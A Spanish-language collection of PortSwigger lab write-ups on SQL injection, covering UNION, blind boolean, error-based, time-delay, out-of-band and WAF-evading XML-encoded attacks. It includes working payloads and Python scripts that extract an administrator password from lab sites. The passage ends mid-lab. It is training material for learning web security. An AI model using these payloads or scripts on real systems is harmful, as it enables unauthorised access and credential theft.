# SQL Injection

## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

### Enunciado

Este laboratorio contiene una vulnerabilidad de inyección SQL en el filtro de categoría de productos. Cuando el usuario selecciona una categoría, la aplicación realiza una consulta SQL como la siguiente:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Para resolver el laboratorio, realiza un ataque de inyección SQL que provoque que la aplicación muestre uno o más productos **no publicados**.

### Resolución

Al capturar la petición vemos que hay un error que no se contempla ya que si ponemos una comilla simple detrás de **Gifts** comentamos el resto de la sentencia.

```
SELECT * FROM products WHERE category = 'Gifts'' AND released = 1
```

Sabiendo esto hacemos la búsqueda:

```bash
?category=Gifts'--
```

Podemos observar como salen 4 elementos cuando salían 3 anteriormente.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Podemos ver que hay una inyección por lo que realizamos esta sentencia.

```
SELECT * FROM products WHERE category = 'Gifts' AND 1=1--' AND released = 1
```

Lo añadimos en la búsqueda y vemos que es vulnerable el parámetro **categories**. Volviendo al enunciado realizamos esta sentencia para resolverlo.

```
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

Lo ponemos en la búsqueda.

```
?category=Gifts' OR 1=1--'
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: SQL injection vulnerability allowing login bypass

### Enunciado

Este laboratorio contiene una vulnerabilidad de inyección SQL en la función de inicio de sesión.

Para resolver el laboratorio, realiza un ataque de inyección SQL que inicie sesión en la aplicación como el usuario **administrador**.

### Resolución

Lo primero que probamos que el usuario no es la misma contraseña. La consulta sería:&#x20;

```
SELECT * FROM usuarios WHERE username='administrator' AND contraseña= 'administrator'
```

Pero no sabemos la contraseña. Como dijimos anteriormente si metemos una comilla simple en el campo de **password** comprobamos que es vulnerable.

```
SELECT * FROM usuarios WHERE username='administrator' AND contraseña= '' OR 1=1--'
```

Por lo tanto insertamos eso en el login.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: SQL injection attack, querying the database type and version on Oracle

### Enunciado

Este laboratorio contiene una **vulnerabilidad de inyección SQL** en el filtro de categoría de productos. Puedes usar un ataque **UNION** para recuperar los resultados de una consulta inyectada.

### Resolución

Mandamos a **Repeater** la petición cuando filtras por categoría. Primero vemos si es vulnerable.

<figure><img src="../../.gitbook/assets/image (1409).png" alt=""><figcaption></figcaption></figure>

Vale si es vulnerable entonces vamos a ver cuántas columnas hay. Al probar vemos que hay 2 columnas.

<figure><img src="../../.gitbook/assets/image (1410).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto tenemos que saber en qué columna está la versión. También como está en otra consulta distinta usamos UNION.

<figure><img src="../../.gitbook/assets/image (1411).png" alt=""><figcaption></figcaption></figure>

Vemos que hemos insertado de manera correcta. Viendo el cheatsheet de PortSwigger nos dice donde se encuentra.

<figure><img src="../../.gitbook/assets/image (1412).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto hacemos la consulta siguiente.

<figure><img src="../../.gitbook/assets/image (1413).png" alt=""><figcaption></figcaption></figure>

## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

### Enunciado

Este laboratorio contiene una **vulnerabilidad de inyección SQL** en el filtro de categoría de productos. Puedes usar un **ataque UNION** para recuperar los resultados de una consulta inyectada. **Mostrar la cadena de versión de la base de datos.**

### Resolución

Hacemos lo mismo que al principio del anterior, es decir, tenemos que ver cuántas columnas hay disponibles.&#x20;

<figure><img src="../../.gitbook/assets/image (1414).png" alt=""><figcaption></figcaption></figure>

Ya sabemos que hay dos columnas, ahora vamos a ver si se pueden almacenar texto.&#x20;

<figure><img src="../../.gitbook/assets/image (1415).png" alt=""><figcaption></figcaption></figure>

Sí se puede ya que devuelven string así que vamos a sacar la versión a través de SELECT.

<figure><img src="../../.gitbook/assets/image (1416).png" alt=""><figcaption></figcaption></figure>

## Lab: SQL injection attack, listing the database contents on non-Oracle databases

### Enunciado

Este laboratorio contiene una **vulnerabilidad de inyección SQL** en el filtro de categoría de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puedes usar un **ataque UNION** para recuperar datos de otras tablas.

La aplicación tiene una función de inicio de sesión, y la base de datos contiene una tabla que almacena **nombres de usuario y contraseñas**. Debes:

1. Determinar el **nombre de esa tabla** y los **campos (columnas)** que contiene.
2. Recuperar el contenido de la tabla para obtener los **nombres de usuario y contraseñas**.
3. Iniciar sesión como el usuario **administrador**.

**Iniciar sesión como el usuario administrador** para resolver el laboratorio.

### Resolución

Como en los anteriores laboratorios vemos cuántas columnas hay.

<figure><img src="../../.gitbook/assets/image (1417).png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos 2 columnas por lo que ahora vamos a mirar si aceptan cadenas de texto.

<figure><img src="../../.gitbook/assets/image (1418).png" alt=""><figcaption></figcaption></figure>

Ahora tenemos que extraer las tablas ya que tenemos que conseguir las credenciales. Tenemos que darnos cuenta que es una base de datos No-Oracle.

<figure><img src="../../.gitbook/assets/image (1419).png" alt=""><figcaption></figcaption></figure>

Podemos ver que se nos muestra las siguientes tablas. Nos interesan las de usuarios.

<figure><img src="../../.gitbook/assets/image (1420).png" alt=""><figcaption></figcaption></figure>

Hacemos la consulta sabiendo el nombre de la tabla queremos saber las columnas.

<figure><img src="../../.gitbook/assets/image (1421).png" alt=""><figcaption></figcaption></figure>

Tenemos el nombre de las columnas tanto los usuarios, contraseñas y contraseñas por lo que realizamos la consulta.

<pre><code><strong>'+UNION+SELECT+username_oybnyq,+password_mtteee+FROM+users_zvzlug--
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (1422).png" alt=""><figcaption></figcaption></figure>

Tenemos las credenciales y nos logueamos.

<figure><img src="../../.gitbook/assets/image (1423).png" alt=""><figcaption></figcaption></figure>

## Lab: SQL injection attack, listing the database contents on Oracle

### Enunciado

Este laboratorio contiene una **vulnerabilidad de inyección SQL** en el filtro de categoría de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puedes usar un **ataque UNION** para recuperar datos de otras tablas.

La aplicación tiene una función de inicio de sesión, y la base de datos contiene una tabla que almacena **nombres de usuario y contraseñas**. Debes:

1. **Determinar el nombre de la tabla** que contiene estas credenciales.
2. **Identificar las columnas** relevantes (como `username` y `password`).
3. **Extraer los datos de esa tabla** usando UNION SELECT.
4. **Iniciar sesión como el usuario administrador** para resolver el laboratorio.

### Resolución

Miramos como siempre cuantas columnas hay como podemos ver es una base de datos Oracle por lo que hay que tenerlo en cuenta.

<figure><img src="../../.gitbook/assets/image (1424).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto sabemos que hay al menos 2 columnas. Vamos a ver si se almacenan cadenas de texto.

<figure><img src="../../.gitbook/assets/image (1425).png" alt=""><figcaption></figcaption></figure>

Sí se almacenan cadenas de texto y sabiendo esto extraemos el nombre de las tablas para la base de datos de Oracle.

<figure><img src="../../.gitbook/assets/image (1426).png" alt=""><figcaption></figcaption></figure>

Como podemos ver hemos conseguido extraerlas pero claramente nos interesa la de usuarios.

<figure><img src="../../.gitbook/assets/image (1427).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto realizamos la consulta a esta tabla para saber las columnas.

<figure><img src="../../.gitbook/assets/image (1428).png" alt=""><figcaption></figcaption></figure>

Tenemos el nombre de las columnas para realizar la consulta y saber las credenciales.

<figure><img src="../../.gitbook/assets/image (1429).png" alt=""><figcaption></figcaption></figure>

Conseguimos las credenciales ya nos podemos loguear.

<figure><img src="../../.gitbook/assets/image (1430).png" alt=""><figcaption></figcaption></figure>

## Lab: SQL injection UNION attack, finding a column containing text

### Enunciado

Este laboratorio contiene una **vulnerabilidad de inyección SQL** en el filtro de categoría de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puedes usar un **ataque UNION** para recuperar datos de otras tablas.

Para construir este tipo de ataque, primero debes **determinar el número de columnas** que devuelve la consulta. Puedes hacerlo usando una técnica aprendida en un laboratorio anterior (por ejemplo, usando `ORDER BY` o probando combinaciones de columnas en el `UNION`).

El siguiente paso es **identificar qué columnas son compatibles con datos de tipo cadena (string)**.

El laboratorio proporcionará un **valor aleatorio** que debes hacer aparecer en los resultados de la consulta. Realizar un **ataque UNION SQL** que **devuelva una fila adicional con el valor proporcionado**, lo que te ayudará a identificar **qué columnas aceptan datos tipo string**.

### Resolución

Primero de todo vemos que contiene 3 columnas.

<figure><img src="../../.gitbook/assets/image (1431).png" alt=""><figcaption></figcaption></figure>

Seguimos viendo que columnas acpetan cadenas de texto.

<figure><img src="../../.gitbook/assets/image (1432).png" alt=""><figcaption></figcaption></figure>

Vemos que en la página principal nos da una cadena de texto por lo que la ponemos en la consulta.

<figure><img src="../../.gitbook/assets/image (1433).png" alt=""><figcaption></figcaption></figure>

## Lab: SQL injection UNION attack, retrieving data from other tables

### Enunciado

Este laboratorio contiene una **vulnerabilidad de inyección SQL** en el filtro de categoría de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puedes usar un **ataque UNION** para recuperar datos de otras tablas.

Para construir este ataque, deberás **combinar varias técnicas** que aprendiste en laboratorios anteriores.

La base de datos contiene una tabla diferente llamada **`users`**, con columnas **`username`** y **`password`**.

Realizar un **ataque de inyección SQL con UNION** para recuperar **todos los nombres de usuario y contraseñas**, y usar esa información para **iniciar sesión como el usuario administrador**.

### Resolución

Vamos a ver cuántas columnas hay.

<figure><img src="../../.gitbook/assets/image (1434).png" alt=""><figcaption></figcaption></figure>

Vemos que tenemos 2 columnas por lo que ahora toca ver si aceptan cadenas texto.

<figure><img src="../../.gitbook/assets/image (1435).png" alt=""><figcaption></figcaption></figure>

Como podemos si acepta así que suponemos que tiene dos columnas de usuarios y contraseñas.

<figure><img src="../../.gitbook/assets/image (1436).png" alt=""><figcaption></figcaption></figure>

Hemos conseguido las credenciales así que ya nos podemos loguear.

<figure><img src="../../.gitbook/assets/image (1437).png" alt=""><figcaption></figcaption></figure>

## Lab: SQL injection UNION attack, retrieving multiple values in a single column

### Enunciado

Este laboratorio contiene una **vulnerabilidad de inyección SQL** en el filtro de categoría de productos. Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puedes usar un **ataque UNION** para recuperar datos de otras tablas.

La base de datos contiene una tabla llamada **`users`**, con las columnas **`username`** y **`password`**. Realizar un **ataque de inyección SQL con UNION** que recupere **todos los nombres de usuario y contraseñas**, y usar esa información para **iniciar sesión como el usuario `administrator`**.

### Resolución

Vemos cuántas columnas tiene.

<figure><img src="../../.gitbook/assets/image (1438).png" alt=""><figcaption></figcaption></figure>

Como podemos observar son 2 columnas, tras esto vemos si aceptan cadenas texto.

<figure><img src="../../.gitbook/assets/image (1439).png" alt=""><figcaption></figcaption></figure>

La segunda columna es la que sí acepta cadena de texto pero claro la información estará junta por lo que vamos a separarla.

<figure><img src="../../.gitbook/assets/image (1440).png" alt=""><figcaption></figcaption></figure>

Ya hemos conseguido las credenciales, vamos a loguearnos.

<figure><img src="../../.gitbook/assets/image (1441).png" alt=""><figcaption></figcaption></figure>

## Lab: Blind SQL injection with conditional responses

### Enunciado

Este laboratorio contiene una **vulnerabilidad de inyección SQL ciega (blind SQL injection)**. La aplicación usa una **cookie de seguimiento** para análisis, y realiza una consulta SQL que incluye el valor de esa cookie.

Los resultados de la consulta **no se devuelven directamente** y **no se muestran mensajes de error**. Sin embargo, la aplicación **muestra un mensaje de "Welcome back" en la página si la consulta devuelve alguna fila**.

La base de datos contiene una tabla diferente llamada **`users`**, con columnas **`username`** y **`password`**. **Explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario `administrator`, e iniciar sesión como dicho usuario.**

### Resolución

A diferencia de los laboratorios anteriores la vulnerabilidad está en **TrackingID**. Lo sabemos porque no nos sale el **Welcome Back**.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto vamos a comprobar si existe la tabla users.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como vemos sí que existe la tabla users. Vamos a ver si el usuario administrador está en users.

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sí está en la tabla de usuarios por lo que vamos a ver su contraseña. Primero debemos saber la longitud de la contraseña.&#x20;

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ya sabemos que la contraseña tiene longitud mayor que 1 por lo que vamos a ver cuánta longitud.

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vamos a comprobar los caracteres que tiene la contraseña yendo al **Intruder.**

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Iría caracter a caracter y sabemos que la primera es una **e**. Mejor script en Python para hacerlo 20 veces o Cluster bomb.

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Este sería el script de Python.

```
import requests
import string
import urllib3


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a41005d03114836802e3037006f00e1.web-security-academy.net/'  # Pon aquí la URL de la página objetivo

payload = "' AND (SELECT SUBSTRING(password, {}, 1) FROM users WHERE username='administrator')='{}'--"
characters = string.printable

password = ''

for i in range(1, 21):
    for char in characters:
        cookie = {'TrackingId': 'GZJbtWWgdaT32Y4D' + payload.format(i, char)}
        response = requests.get(url, cookies=cookie, verify=False)
        if "Welcome" in response.text:
            password += char
            print(f"[+] Carácter encontrado: {char} - Contraseña parcial: {password}")
            break

print(f"\n[+] Contraseña completa encontrada: {password}")
```

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con las credenciales.

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab 12: Blind SQL injection with conditional errors

### Enunciado

Este laboratorio contiene una **vulnerabilidad de inyección SQL ciega (blind SQL injection)**. La aplicación utiliza una **cookie de seguimiento** para análisis y realiza una consulta SQL que incluye el valor de esa cookie.

Los resultados de la consulta **no se devuelven**, y **la aplicación no responde de forma diferente según si la consulta devuelve filas o no**. Sin embargo, **si la consulta provoca un error, la aplicación muestra un mensaje de error personalizado**.

La base de datos contiene una tabla llamada **`users`** con las columnas **`username`** y **`password`**. **Explotar la vulnerabilidad de inyección SQL ciega basada en errores para averiguar la contraseña del usuario `administrator`, e iniciar sesión como ese usuario.**

### Resolución

Vemos dónde tenemos la vulnerabilidad añadiendo la comilla al **TrackingID** y recargando la página forzamos el error.

<figure><img src="../../.gitbook/assets/image (1442).png" alt=""><figcaption></figcaption></figure>



Estamos frente a una base de datos Oracle.

<figure><img src="../../.gitbook/assets/image (1443).png" alt=""><figcaption></figcaption></figure>

Ahora vamos a confirmar si hay una tabla de usuarios.

<figure><img src="../../.gitbook/assets/image (1445).png" alt=""><figcaption></figcaption></figure>

Como la hay vamos a ver si está el usuario en esa tabla. Si nos da error es que existe ya que estamos realizando la consulta al revés.

<figure><img src="../../.gitbook/assets/image (1446).png" alt=""><figcaption></figcaption></figure>

Confirmamos que hay un administrator como usuario. Toca conseguir la contraseña del usuario. Primero los caracteres.

<figure><img src="../../.gitbook/assets/image (1448).png" alt=""><figcaption></figcaption></figure>

Miramos 30 caracteres.

<figure><img src="../../.gitbook/assets/image (1450).png" alt=""><figcaption></figcaption></figure>

Vamos al **Intruder** para ver cuántos caracteres exactamente tiene la contraseña.

<figure><img src="../../.gitbook/assets/image (1451).png" alt=""><figcaption></figcaption></figure>

Vemos que tiene 20 caracteres tal como paso en el anterior podemos hacer Cluster Bomb o un script en Python para aligerar y hacerlo más automático hago el script.

<figure><img src="../../.gitbook/assets/image (1452).png" alt=""><figcaption></figcaption></figure>

```
#!/usr/bin/env python3

import requests
from string import ascii_lowercase, digits

def main():
        url = 'https://0aa2009404cb485d801e26cc00f80097.web-security-academy.net/'
        trackingid = 'APnrWlyEfL4OH51h'

        chars = ascii_lowercase + digits
        position = 1
        password = ''

        try:
                while True:
                        for character in chars:
                                payload = f"""{trackingid}'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"""

                                cookie = {
                                        'session': 'YOUR_SESSIONID',
                                        'TrackingId': payload
                                }

                                r = requests.get(url, cookies=cookie)

                                if r.status_code == 200:
                                        # print('Error occurred')
                                        continue
                                else:
                                        # print('No error')
                                        position += 1
                                        password += ''.join(character)
                                        print(f'[+] Found password: {password}', end='\r')
                                        break

                        if len(password) >= 20:
                                print(f'[+] administrator password: {password}')
                                exit()
        except KeyboardInterrupt:
                print('\n[*] Bye!')

if __name__ == '__main__':
        main()
```

{% hint style="info" %}
Este script se ha cogido de esta resolución [https://siunam321.github.io/ctf/portswigger-labs/SQL-Injection/sqli-12/](https://siunam321.github.io/ctf/portswigger-labs/SQL-Injection/sqli-12/)
{% endhint %}

<figure><img src="../../.gitbook/assets/image (1453).png" alt=""><figcaption></figcaption></figure>

Nos logueamos.

<figure><img src="../../.gitbook/assets/image (1454).png" alt=""><figcaption></figcaption></figure>

## Lab: Visible error-based SQL injection

### Enunciado

**Este laboratorio contiene una vulnerabilidad de inyección SQL.** La aplicación usa una **cookie de seguimiento (tracking cookie)** para análisis, y realiza una **consulta SQL** que incluye el valor enviado en esa cookie.

**Los resultados de la consulta no se devuelven** al usuario. La base de datos contiene una tabla diferente llamada **`users`**, con columnas **`username`** y **`password`**.

**Para resolver el laboratorio, debes encontrar una forma de filtrar (leak) la contraseña del usuario `administrator`, y luego iniciar sesión en su cuenta.**

### Resolución

Vemos la vulnerabilidad que en este caso sigue siendo el **TrackingID** añadiendo una comilla.

<figure><img src="../../.gitbook/assets/image (1456).png" alt=""><figcaption></figcaption></figure>

El error que se nos muestra es muy llamativo ya que nos dice que el valor de la cookie se inyecta en la consulta. Hacemos pequeña modificación para que no nos salga ese error.

<figure><img src="../../.gitbook/assets/image (1457).png" alt=""><figcaption></figcaption></figure>

Vamos a ver con el siguiente payload la estructura de la consulta.

<figure><img src="../../.gitbook/assets/image (1458).png" alt=""><figcaption></figcaption></figure>

Nos da error vamos a cambiarla a hacer una expresión booleana.

<figure><img src="../../.gitbook/assets/image (1459).png" alt=""><figcaption></figcaption></figure>

Con esto demostramos que podemos inyectar sin romper la consulta. vamos a ver si extraemos datos de usuarios.

<figure><img src="../../.gitbook/assets/image (1462).png" alt=""><figcaption></figcaption></figure>

Nos da un error nuevo por lo que vamos a cambiarlo y limitamos la consulta.

<figure><img src="../../.gitbook/assets/image (1461).png" alt=""><figcaption></figcaption></figure>

Vemos que existe el usuario por lo que nos falta extraer la contraseña.

<figure><img src="../../.gitbook/assets/image (1463).png" alt=""><figcaption></figcaption></figure>

Se nos muestra otro error que delata la contraseña por lo que nos logueamos con las credenciales.

<figure><img src="../../.gitbook/assets/image (1464).png" alt=""><figcaption></figcaption></figure>

## Lab: Blind SQL injection with time delays

### Enunciado

**Este laboratorio contiene una vulnerabilidad de inyección SQL ciega (blind SQL injection).**

La aplicación utiliza una **cookie de seguimiento (tracking cookie)** para análisis, y realiza una **consulta SQL** que incluye el valor enviado en dicha cookie.

**Los resultados de la consulta no se devuelven**, y la aplicación **no responde de forma diferente** dependiendo de si la consulta devuelve filas o provoca un error.

Sin embargo, dado que la consulta se ejecuta de forma **sincrónica**, es posible **provocar retrasos condicionales en la ejecución** para inferir información.

### Resolución

Vamos a ver qué tipo de base de datos es.

<figure><img src="../../.gitbook/assets/image (1465).png" alt=""><figcaption></figcaption></figure>

Es base de datos PostgreSQL.

<figure><img src="../../.gitbook/assets/image (1466).png" alt=""><figcaption></figcaption></figure>

## Lab: Blind SQL injection with time delays and information retrieval

### Enunciado

**Este laboratorio contiene una vulnerabilidad de inyección SQL ciega (blind SQL injection).**

La aplicación utiliza una **cookie de seguimiento (tracking cookie)** para análisis, y realiza una **consulta SQL** que incluye el valor enviado en esa cookie.

**Los resultados de la consulta no se devuelven**, y la aplicación **no responde de manera diferente** según si la consulta devuelve filas o produce un error.

Sin embargo, dado que la consulta se ejecuta de forma **sincrónica**, es posible **provocar retrasos condicionales en la ejecución** para inferir información.

La base de datos contiene una tabla llamada **`users`**, con columnas **`username`** y **`password`**.

**Explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario `administrator`, e iniciar sesión en su cuenta.**

### Resolución

Vamos a ver qué base de datos es.

<figure><img src="../../.gitbook/assets/image (1467).png" alt=""><figcaption></figcaption></figure>

Sabiendo esto miramos el siguiente payload.

<figure><img src="../../.gitbook/assets/image (1468).png" alt=""><figcaption></figcaption></figure>

Vamos a dormir la base de datos si existe el usuario en la tabla users.&#x20;

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como tarda 10 segundos sí existe el usuario. Ahora toca ver su contraseña.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Observamos que tarda 10 segundos por lo que la contraseña tiene 20 caracteres.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como en los laboratorios anteriores se podría construir la contraseña en Cluster Bomb o de manera automática en Python.

```
import requests
import string
import urllib.parse
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0a0b008504a1eb638154611b005c00f9.web-security-academy.net/'
payload = "'||(select case when (username='administrator' and substring(password,{},1)='{}') then pg_sleep(10) else pg_sleep(2) end from users)--"
characters = string.printable

password = ''

for i in range(1, 21):
    for char in characters:
        cookie = {'TrackingId': 'TIHGzblAUd3dagoi' + payload.format(i, char)}
        r = requests.get(url, cookies=cookie, verify=False)
        if int(r.elapsed.total_seconds()) > 9:
            password += char
            break

    print("[x] La contraseña es: {}".format(password))
```

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Lab: Blind SQL injection with out-of-band interaction

### Enunciado

**Este laboratorio contiene una vulnerabilidad de inyección SQL ciega.**

La aplicación utiliza una cookie de seguimiento (_tracking cookie_) para análisis, y ejecuta una consulta SQL que incluye el valor de la cookie enviada.

La consulta SQL se ejecuta de forma **asíncrona** y no tiene ningún efecto en la respuesta de la aplicación. Sin embargo, puedes provocar interacciones _out-of-band_ (fuera de banda) con un dominio externo.

**Para resolver el laboratorio**, explota la vulnerabilidad de inyección SQL para causar una consulta DNS (DNS lookup) hacia un dominio de Burp Collaborator.

### Resolución

Miramos en el cheatsheet como sería la consulta a realizar.

{% hint style="info" %}
Ester laboratorio se hace con BurpSuite Professional
{% endhint %}

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Generamos 1 payload en **Collaborator** y lo copiamos en la consulta.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-28 165113.png" alt=""><figcaption></figcaption></figure>

Vemos como en la ventana de **Collaborator** al enviarlo se ven las DNS y así completamos el laboratorio.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-28 165329.png" alt=""><figcaption></figcaption></figure>

## Lab: Blind SQL injection with out-of-band data exfiltration

### Enunciado

**Este laboratorio contiene una vulnerabilidad de inyección SQL ciega.**

La aplicación utiliza una cookie de seguimiento (_tracking cookie_) para fines de análisis y ejecuta una consulta SQL que incluye el valor de la cookie enviada.

La consulta SQL se ejecuta de forma **asíncrona** y no tiene ningún efecto en la respuesta de la aplicación. Sin embargo, puedes provocar interacciones _out-of-band_ (fuera de banda) con un dominio externo.

La base de datos contiene una tabla diferente llamada **users**, con columnas llamadas **username** y **password**. Debes explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del usuario **administrator**.

**Para resolver el laboratorio, inicia sesión como el usuario administrator.**

### Resolución

Interceptamos y realizamos la consulta correspondiente a Oracle con el payload generado en **Collaborator**.

{% hint style="info" %}
Este laboratorio se hace con BurpSuite Professional
{% endhint %}

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-28 171036.png" alt=""><figcaption></figcaption></figure>

Vemos que antes del punto es la contraseña correspondiente al usuario y al logueanos con dichas credenciales completamos el laboratorio.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-28 171018.png" alt=""><figcaption></figcaption></figure>

## Lab: SQL injection with filter bypass via XML encoding

### Enunciado

**Este laboratorio contiene una vulnerabilidad de inyección SQL en su funcionalidad de verificación de stock.**

Los resultados de la consulta se devuelven en la respuesta de la aplicación, por lo que puedes utilizar un ataque **UNION** para recuperar datos de otras tablas.

La base de datos contiene una tabla **users**, que almacena los nombres de usuario y contraseñas de los usuarios registrados.

**Para resolver el laboratorio, realiza un ataque de inyección SQL para obtener las credenciales del usuario admin y luego inicia sesión en su cuenta.**

### Resolución

La vulnerabilidad está en el stock del producto.

<figure><img src="../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Las consultas básicas maliciosas las detecta como ataques.

<figure><img src="../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Probamos a ponerlas hexadecimal.

> Hay una extensión llamada HackVector

<figure><img src="../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ya no nos sale lo del ataque así que vamos a ver cuántas columnas tiene.

<figure><img src="../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Cuando queremos saber s hay más de una columna nos sale que no hay unidades. Hacemos un script de Python para automatizar eso.

```
#!/usr/bin/python3

import requests

def main():
    url = 'https://0a4300460442812480ea1c8e008e0015.web-security-academy.net/product/stock'

    cookie = {
        'session': 'Ekz8u97zV5O9DK8grBFoVxJpUzL3DuaH'
    }

    header = {
        'Content-Type': 'application/xml'
    }

    # UNION SELECT NULL
    payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;'
    
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
    <stockCheck>
        <productId>1</productId>
        <storeId>1 {payload}</storeId>
    </stockCheck>'''

    print(requests.post(url, cookies=cookie, headers=header, data=xml).text)

if __name__ == '__main__':
    main()
```

<figure><img src="../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Cambio el payload para ver si acepta la columna cadena de texto.

```
# UNION SELECT 'string'
payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#39;&#115;&#116;&#114;&#105;&#110;&#103;&#39;'
```

<figure><img src="../../.gitbook/assets/image (11) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sí acepta cadenas de texto por lo que vemos qué base de datos usa.

```
# UNION SELECT version()
payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#118;&#101;&#114;&#115;&#105;&#111;&#110;&#40;&#41;'
```

<figure><img src="../../.gitbook/assets/image (12) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Sabiendo eso vemos la consulta para ver si tiene una tabla usuarios.

```
# UNION SELECT table_name FROM information_schema.tables
payload = '&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#116;&#97;&#98;&#108;&#101;&#95;&#110;&#97;&#109;&#101;&#32;&#70;&#82;&#79;&#77;&#32;&#105;&#110;&#102;&#111;&#114;&#109;&#97;&#116;&#105;&#111;&#110;&#95;&#115;&#99;&#104;&#101;&#109;&#97;&#46;&#116;&#97;&#98;&#108;&#101;&#115;'
```

<figure><img src="../../.gitbook/assets/image (13) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vamos a ver las columnas de la tabla.

```
# UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'
